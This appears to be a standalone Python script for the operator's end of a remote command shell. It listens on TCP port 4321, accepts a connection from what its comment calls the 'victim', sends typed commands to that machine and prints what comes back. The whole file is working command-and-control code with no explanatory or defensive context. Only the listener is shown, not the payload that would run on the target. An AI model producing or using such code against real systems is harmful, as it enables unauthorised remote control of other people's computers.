import socket

HOST = "0.0.0.0" # ip address of victim, 0.0.0.0 means all local ip on victim's machine
PORT = 4321
BUFFER_SIZE = 1024

s = socket.socket()
s.bind((HOST, PORT))

s.listen(5)
print("Listening ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")


message = "Testing... , Done".encode()
client_socket.send(message)

while True:
    
    command = input("Enter the command you wanna execute:")
    client_socket.send(command.encode())

    if command == "exit":
        break

    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)

client_socket.close()
s.close()
